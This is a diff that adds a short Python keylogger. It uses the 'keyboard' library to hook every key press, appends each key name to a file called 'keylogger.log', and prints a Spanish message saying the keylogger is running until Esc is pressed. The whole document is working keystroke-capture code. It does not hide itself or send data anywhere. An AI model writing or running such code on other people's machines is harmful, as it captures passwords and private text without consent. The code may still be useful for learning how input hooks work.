@@ -1,0 +1,10 @@
+import keyboard
+
+def Saca(event):
+    with open('keylogger.log', 'a') as file:  
+        file.write(event.name)  
+
+keyboard.on_press(Saca)
+
+print("Keylogger en ejecución. Presiona 'Esc' para detener.")
+keyboard.wait('esc')
